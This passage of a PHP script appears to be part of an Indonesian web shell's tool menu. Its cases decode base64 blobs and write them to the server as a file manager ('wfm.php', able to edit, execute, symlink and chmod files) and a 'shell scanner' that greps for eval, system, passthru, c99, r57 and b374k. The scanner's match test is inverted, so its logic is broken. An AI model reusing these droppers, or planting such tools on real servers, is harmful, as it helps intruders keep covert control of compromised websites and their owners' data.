JyA9PiAnIlslMV0iIGNhbiBub3QgYmUgZWRpdGVkLicsDQonZXhlY3V0ZWQnID0+ICJcIlslMV1cIiBoYXMgYmVlbiBleGVjdXRlZCBzdWNjZXNzZnVsbHk6XG57JTJ9IiwNCidub3RfZXhlY3V0ZWQnID0+ICJcIlslMV1cIiBjb3VsZCBub3QgYmUgZXhlY3V0ZWQgc3VjY2Vzc2Z1bGx5OlxueyUyfSIsDQonc2F2ZWQnID0+ICciWyUxXSIgaGFzIGJlZW4gc2F2ZWQuJywNCidub3Rfc2F2ZWQnID0+ICciWyUxXSIgY291bGQgbm90IGJlIHNhdmVkLicsDQonc3ltbGlua2VkJyA9PiAnU3ltbGluayBmcm9tICJbJTJdIiB0byAiWyUxXSIgaGFzIGJlZW4gY3JlYXRlZC4nLA0KJ25vdF9zeW1saW5rZWQnID0+ICdTeW1saW5rIGZyb20gIlslMl0iIHRvICJbJTFdIiBjb3VsZCBub3QgYmUgY3JlYXRlZC4nLA0KJ3Blcm1pc3Npb25fZm9yJyA9PiAnUGVybWlzc2lvbiBvZiAiWyUxXSI6JywNCidwZXJtaXNzaW9uX3NldCcgPT4gJ1Blcm1pc3Npb24gb2YgIlslMV0iIHdhcyBzZXQgdG8gWyUyXS4nLA0KJ3Blcm1pc3Npb25fbm90X3NldCcgPT4gJ1Blcm1pc3Npb24gb2YgIlslMV0iIGNvdWxkIG5vdCBiZSBzZXQgdG8gWyUyXS4nLA0KJ25vdF9yZWFkYWJsZScgPT4gJyJbJTFdIiBjYW4gbm90IGJlIHJlYWQuJw0KCQkpOw0KDQoJfQ0KDQp9DQoNCmZ1bmN0aW9uIGdldGltYWdlICgkaW1hZ2UpIHsNCglzd2l0Y2ggKCRpbWFnZSkgew0KCWNhc2UgJ2ZpbGUnOg0KCQlyZXR1cm4gYmFzZTY0X2RlY29kZSgnUjBsR09EbGhFUUFOQUpFREFKbVptZi8vL3dBQUFQLy8veUg1QkFIb0F3TUFMQUFBQUFBUkFBMEFBQUl0bklHSnhnMEI0MnJzaVN2Q0EvUkVtWFFXaG1uaWgzTFVTR2FxZzM1dkZiU1h1Y2JTYWJ1bmpuTW9ocThDQURzQScpOw0KCWNhc2UgJ2ZvbGRlcic6DQoJCXJldHVybiBiYXNlNjRfZGVjb2RlKCdSMGxHT0RsaEVRQU5BSkVEQUptWm1mLy8vOHpNelAvLy95SDVCQUhvQXdNQUxBQUFBQUFSQUEwQUFBSXFuSStad0t3YllnVFB0SXVkbGJ3TE9nQ0JRSlltQ1lybittM3NtWTV2R2MrMGE3ZGhqaDdaYnlnQUFEc0EnKTsNCgljYXNlICdoaWRkZW5fZmlsZSc6DQoJCXJldHVybiBiYXNlNjRfZGVjb2RlKCdSMGxHT0RsaEVRQU5BSkVEQU13QUFQLy8vNW1abWYvLy95SDVCQUhvQXdNQUxBQUFBQUFSQUEwQUFBSXRuSUdKeGcwQjQycnNpU3ZDQS9SRW1YUVdobW5paDNMVVNHYXFnMzV2RmJTWHVjYlNhYnVuam5Nb2hxOENBRHNBJyk7DQoJY2FzZSAnbGluayc6DQoJCXJldHVybiBiYXNlNjRfZGVjb2RlKCdSMGxHT0RsaEVRQU5BS0lFQUptWm1mLy8vd0FBQU13QUFQLy8vd0FBQUFBQUFBQUFBQ0g1QkFIb0F3UUFMQUFBQUFBUkFBMEFBQU01U0FyY3JEQ0NRT3VMY0lvdHdnVFlVbGxOT0EwRHhYa21oWTRzaE01enNNVUtUWThnTmdVdlc2Y25BYVpneE15SU0yekJMQ2FIbEpnQUFEc0EnKTsNCgljYXNlICdzbWlsZXknOg0KCQlyZXR1cm4gYmFzZTY0X2RlY29kZSgnUjBsR09EbGhFUUFOQUpFQ0FBQUFBUC8vQVAvLy93QUFBQ0g1QkFIb0F3SUFMQUFBQUFBUkFBMEFBQUlzbEkrcEF1MndEQWl6MGpXRDNocW1CelpmMVZDbGVKUWNoMHJrZG5wcEIzZEtadUl5Z3JNUkUvb0pEd1VBT3dBPScpOw0KCWNhc2UgJ2Fycm93JzoNCgkJcmV0dXJuIGJhc2U2NF9kZWNvZGUoJ1IwbEdPRGxoRVFBTkFJQUJBQUFBQVAvLy95SDVCQUVLQUFFQUxBQUFBQUFSQUEwQUFBSWRqQTl3eTZnTlE0cHdVbWF2MHl2bitoaEppSTNtQ0o2b3RySWt4eFFBT3c9PScpOw0KCX0NCn0NCg0KZnVuY3Rpb24gaHRtbF9oZWFkZXIgKCkgew0KCWdsb2JhbCAkc2l0ZV9jaGFyc2V0Ow0KDQoJZWNobyA8PDxFTkQNCjwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFN0cmljdC8vRU4iDQogICAgICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS1zdHJpY3QuZHRkIj4NCjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCjxoZWFkPg0KDQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD0kc2l0ZV9jaGFyc2V0IiAvPg0KDQo8dGl0bGU+SGFJeUZASGtSa29aPC90aXRsZT4NCg0KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmJvZHkgeyBmb250OiBzbWFsbCBzYW5zLXNlcmlmOyB0ZXh0LWFsaWduOiBjZW50ZXIgfQ0KaW1nIHsgd2lkdGg6IDE3cHg7IGhlaWdodDogMTNweCB9DQphLCBhOnZpc2l0ZWQgeyB0ZXh0LWRlY29yYXRpb246IG5vbmU7IGNvbG9yOiBuYXZ5IH0NCmhyIHsgYm9yZGVyLXN0eWxlOiBub25lOyBoZWlnaHQ6IDFweDsgYmFja2dyb3VuZC1jb2xvcjogc2lsdmVyOyBjb2xvcjogc2lsdmVyIH0NCiNtYWluIHsgbWFyZ2luLXRvcDogNnB0OyBtYXJnaW4tbGVmdDogYXV0bzsgbWFyZ2luLXJpZ2h0OiBhdXRvOyBib3JkZXItc3BhY2luZzogMXB4IH0NCiNtYWluIHRoIHsgYmFja2dyb3VuZDogI2VlZTsgcGFkZGluZzogM3B0IDNwdCAwcHQgM3B0IH0NCi5saXN0aW5nIHRoLCAubGlzdGluZyB0ZCB7IHBhZGRpbmc6IDFweCAzcHQgMCAzcHQgfQ0KLmxpc3RpbmcgdGggeyBib3JkZXI6IDFweCBzb2xpZCBzaWx2ZXIgfQ0KLmxpc3RpbmcgdGQgeyBib3JkZXI6IDFweCBzb2xpZCAjZGRkOyBiYWNrZ3JvdW5kOiB3aGl0ZSB9DQoubGlzdGluZyAuY2hlY2tib3ggeyB0ZXh0LWFsaWduOiBjZW50ZXIgfQ0KLmxpc3RpbmcgLmZpbGVuYW1lIHsgdGV4dC1hbGlnbjogbGVmdCB9DQoubGlzdGluZyAuc2l6ZSB7IHRleHQtYWxpZ246IHJpZ2h0IH0NCi5saXN0aW5nIHRoLnBlcm1pc3Npb24geyB0ZXh0LWFsaWduOiBsZWZ0IH0NCi5saXN0aW5nIHRkLnBlcm1pc3Npb24geyBmb250LWZhbWlseTogbW9ub3NwYWNlIH0NCi5saXN0aW5nIC5vd25lciB7IHRleHQtYWxpZ246IGxlZnQgfQ0KLmxpc3RpbmcgLmdyb3VwIHsgdGV4dC1hbGlnbjogbGVmdCB9DQoubGlzdGluZyAuZnVuY3Rpb25zIHsgdGV4dC1hbGlnbjogbGVmdCB9DQoubGlzdGluZ19mb290ZXIgdGQgeyBiYWNrZ3JvdW5kOiAjZWVlOyBib3JkZXI6IDFweCBzb2xpZCBzaWx2ZXIgfQ0KI2RpcmVjdG9yeSwgI3VwbG9hZCwgI2NyZWF0ZSwgLmxpc3RpbmdfZm9vdGVyIHRkLCAjZXJyb3IgdGQsICNub3RpY2UgdGQgeyB0ZXh0LWFsaWduOiBsZWZ0OyBwYWRkaW5nOiAzcHQgfQ0KI2RpcmVjdG9yeSB7IGJhY2tncm91bmQ6ICNlZWU7IGJvcmRlcjogMXB4IHNvbGlkIHNpbHZlciB9DQojdXBsb2FkIHsgcGFkZGluZy10b3A6IDFlbSB9DQojY3JlYXRlIHsgcGFkZGluZy1ib3R0b206IDFlbSB9DQouc21hbGwsIC5zbWFsbCBvcHRpb24geyBmb250LXNpemU6IHgtc21hbGwgfQ0KdGV4dGFyZWEgeyBib3JkZXI6IG5vbmU7IGJhY2tncm91bmQ6IHdoaXRlIH0NCnRhYmxlLmRpYWxvZyB7IG1hcmdpbi1sZWZ0OiBhdXRvOyBtYXJnaW4tcmlnaHQ6IGF1dG8gfQ0KdGQuZGlhbG9nIHsgYmFja2dyb3VuZDogI2VlZTsgcGFkZGluZzogMWV4OyBib3JkZXI6IDFweCBzb2xpZCBzaWx2ZXI7IHRleHQtYWxpZ246IGNlbnRlciB9DQojcGVybWlzc2lvbiB7IG1hcmdpbi1sZWZ0OiBhdXRvOyBtYXJnaW4tcmlnaHQ6IGF1dG8gfQ0KI3Blcm1pc3Npb24gdGQgeyBwYWRkaW5nLWxlZnQ6IDNwdDsgcGFkZGluZy1yaWdodDogM3B0OyB0ZXh0LWFsaWduOiBjZW50ZXIgfQ0KdGQucGVybWlzc2lvbl9hY3Rpb24geyB0ZXh0LWFsaWduOiByaWdodCB9DQojc3ltbGluayB7IGJhY2tncm91bmQ6ICNlZWU7IGJvcmRlcjogMXB4IHNvbGlkIHNpbHZlciB9DQojc3ltbGluayB0ZCB7IHRleHQtYWxpZ246IGxlZnQ7IHBhZGRpbmc6IDNwdCB9DQojcmVkX2J1dHRvbiB7IHdpZHRoOiAxMjBweDsgY29sb3I6ICM0MDAgfQ0KI2dyZWVuX2J1dHRvbiB7IHdpZHRoOiAxMjBweDsgY29sb3I6ICMwNDAgfQ0KI2Vycm9yIHRkIHsgYmFja2dyb3VuZDogbWFyb29uOyBjb2xvcjogd2hpdGU7IGJvcmRlcjogMXB4IHNvbGlkIHNpbHZlciB9DQojbm90aWNlIHRkIHsgYmFja2dyb3VuZDogZ3JlZW47IGNvbG9yOiB3aGl0ZTsgYm9yZGVyOiAxcHggc29saWQgc2lsdmVyIH0NCiNub3RpY2UgcHJlLCAjZXJyb3IgcHJlIHsgYmFja2dyb3VuZDogc2lsdmVyOyBjb2xvcjogYmxhY2s7IHBhZGRpbmc6IDFleDsgbWFyZ2luLWxlZnQ6IDFleDsgbWFyZ2luLXJpZ2h0OiAxZXggfQ0KY29kZSB7IGZvbnQtc2l6ZTogMTJwdCB9DQp0ZCB7IHdoaXRlLXNwYWNlOiBub3dyYXAgfQ0KPC9zdHlsZT4NCg0KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KPCEtLQ0KZnVuY3Rpb24gYWN0aXZhdGUgKG5hbWUpIHsNCglpZiAoZG9jdW1lbnQgJiYgZG9jdW1lbnQuZm9ybXNbMF0gJiYgZG9jdW1lbnQuZm9ybXNbMF0uZWxlbWVudHNbJ2ZvY3VzJ10pIHsNCgkJZG9jdW1lbnQuZm9ybXNbMF0uZWxlbWVudHNbJ2ZvY3VzJ10udmFsdWUgPSBuYW1lOw0KCX0NCn0NCi8vLS0+DQo8L3NjcmlwdD4NCg0KPC9oZWFkPg0KPGJvZHk+DQoNCg0KRU5EOw0KDQp9DQoNCmZ1bmN0aW9uIGh0bWxfZm9vdGVyICgpIHsNCg0KCWVjaG8gPDw8RU5EDQo8L2JvZHk+DQo8L2h0bWw+DQpFTkQ7DQoNCn0NCg0KZnVuY3Rpb24gbm90aWNlICgkcGhyYXNlKSB7DQoJZ2xvYmFsICRjb2xzOw0KDQoJJGFyZ3MgPSBmdW5jX2dldF9hcmdzKCk7DQoJYXJyYXlfc2hpZnQoJGFyZ3MpOw0KDQoJcmV0dXJuICc8dHIgaWQ9Im5vdGljZSI+DQoJPHRkIGNvbHNwYW49IicgLiAkY29scyAuICciPicgLiBwaHJhc2UoJHBocmFzZSwgJGFyZ3MpIC4gJzwvdGQ+DQo8L3RyPg0KJzsNCg0KfQ0KDQpmdW5jdGlvbiBlcnJvciAoJHBocmFzZSkgew0KCWdsb2JhbCAkY29sczsNCg0KCSRhcmdzID0gZnVuY19nZXRfYXJncygpOw0KCWFycmF5X3NoaWZ0KCRhcmdzKTsNCg0KCXJldHVybiAnPHRyIGlkPSJlcnJvciI+DQoJPHRkIGNvbHNwYW49IicgLiAkY29scyAuICciPicgLiBwaHJhc2UoJHBocmFzZSwgJGFyZ3MpIC4gJzwvdGQ+DQo8L3RyPg0KJzsNCg0KfQ0KDQo/Pg==";
			$dos = @fopen("wfm.php", "w");
			fwrite($dos, base64_decode($wfm));
			fclose($dos);
			
			echo "[!] Webadmin File Manager berhasil dipasang";
			break;
		case 'otoy':
			$scan = "PGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5TaGVsbCBTY2FubmVyIGJ5IE15SGVhcnRJc3lyPC90aXRsZT4NCjxzdHlsZT4NCmJvZHkgew0KYmFja2dyb3VuZDogIzAwMDsNCmNvbG9yOiAjZmZmOw0KfQ0KaDEgew0KZm9udC1mYW1pbHk6IENvdXJpZXI7DQpjb2xvcjogbGltZTsNCnRleHQtYWxpZ246IGNlbnRlcjsNCn0NCmhyIHsNCmJvcmRlcjogMXB4IGRhc2hlZCAjZmZmOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KPGgxPlNoZWxsIFNjYW5uZXIgYnkgTXlIZWFydElzeXI8L2gxPg0KPGhyPg0KU2hlbGwgU2Nhbm5lcjxicj48YnI+DQpjb2RlZCBieTogTXlIZWFydElzeXI8YnI+PGJyPg0KR3IzM3R6IHRvOiBBbGwgSW5kb25lc2lhbiBIYWNrZXJzIENvbW11bml0eTxicj48YnI+DQo8aHI+DQo8P3BocA0KLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCi8vIFNoZWxsIFNjYW5uZXIgYnkgTXlIZWFydElzeXIgICAgICAgICAgIC8vDQovLyB0ZXJpbnNwaXJhc2kgZGFyaSBzaGVsbCBzY2FubmVybnlhICAgICAvLw0KLy8gcjEzeTVoNCBhLmsuYSBvbSBhbmhhcmt1ICAgICAgICAgICAgICAgLy8NCi8vIHRhcGkgbG9naWthbnlhIGJ1YXRhbiBzZW5kaXJpICAgICAgICAgIC8vDQovLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KZnVuY3Rpb24gTGlzdEZpbGVzKCRkaXIpIHsNCiAgICBpZigkZGggPSBvcGVuZGlyKCRkaXIpKSB7DQoNCiAgICAgICAgJGZpbGVzID0gYXJyYXkoKTsNCiAgICAgICAgJGlubmVyX2ZpbGVzID0gYXJyYXkoKTsNCg0KICAgICAgICB3aGlsZSgkZmlsZSA9IHJlYWRkaXIoJGRoKSkgew0KICAgICAgICAgICAgaWYoJGZpbGUgIT0gIi4iICYmICRmaWxlICE9ICIuLiIpIHsNCiAgICAgICAgICAgICAgICBpZihpc19kaXIoJGRpciAuICIvIiAuICRmaWxlKSkgew0KICAgICAgICAgICAgICAgICAgICAkaW5uZXJfZmlsZXMgPSBMaXN0RmlsZXMoJGRpciAuICIvIiAuICRmaWxlKTsNCiAgICAgICAgICAgICAgICAgICAgaWYoaXNfYXJyYXkoJGlubmVyX2ZpbGVzKSkgJGZpbGVzID0gYXJyYXlfbWVyZ2UoJGZpbGVzLCAkaW5uZXJfZmlsZXMpOyANCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICBhcnJheV9wdXNoKCRmaWxlcywgJGRpciAuICIvIiAuICRmaWxlKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBjbG9zZWRpcigkZGgpOw0KICAgICAgICByZXR1cm4gJGZpbGVzOw0KICAgIH0NCn0NCg0KJHJlZ2V4ID0gYXJyYXkoJ2Jhc2U2NF9kZWNvZGUnLCdzeXN0ZW0nLCdwYXNzdGhydScsJ3BvcGVuJywnZXhlYycsJ3NoZWxsX2V4ZWMnLCdldmFsJywnbW92ZV91cGxvYWRlZF9maWxlJywgDQonc3RyX3JvdDEzJywgJ2d6aW5mbGF0ZScsICdjOTknLCAncjU3JywgJ2IzNzRrJywgJ2lkeCcsICdoYWNrZWQgYnknKTsNCg0KJHRhcmdldCA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ107DQpmb3JlYWNoIChMaXN0RmlsZXMoJHRhcmdldCkgYXMgJGtleT0+JGZpbGUpew0KICAgICAgJG5GaWxlID0gc3Vic3RyKCRmaWxlLCAtNCwgNCk7DQogICAgICBpZigkbkZpbGUgPT0gIi5waHAiKXsNCiAgICAgICAgaWYoJGZpbGU9PSRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10uJF9TRVJWRVJbJ1BIUF9TRUxGJ10pew0KICAgICAgICB9DQoJCWVsc2V7DQoJCQkkb3BzID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKTsNCgkJCSRvcD1zdHJ0b2xvd2VyKCRvcHMpOw0KCQkJZm9yZWFjaCgkcmVnZXggYXMgJGt1bmNpKXsNCgkJCQlpZighcHJlZ19tYXRjaCgiLyRrdW5jaS8iLCAkb3ApKXsNCgkJCQkJZWNobyAiPGZvbnQgY29sb3I9J2JsdWUnPiRmaWxlPC9mb250PiwgTWF0Y2hlcyByZWdleDogPGZvbnQgY29sb3I9J3JlZCc+LyRrdW5jaS9pPC9mb250Pjxicj4iOw0KCQkJCX0NCgkJCX0NCgkJfQ0KCX0NCn0NCj8+DQo8Y2VudGVyPiZjb3B5OyBDb3B5bGVmdCBNeUhlYXJ0SXN5cjwvY2VudGVyPg0KPC9ib2R5Pg0KPC9odG1sPg==";
			$mos = @fopen("shellscan.php", "w");
			fwrite($mos, base64_decode($scan));
			fclose($mos);
			
			echo "[!] Shell Scanner berhasil dipasang";
			break;
		default: break;
	}
}

echo "<br><center>&copy; Copyleft <a href='https://myheart-isyr.blogspot.com' target='_blank'>MyHeartIsyr</a></center>";
?>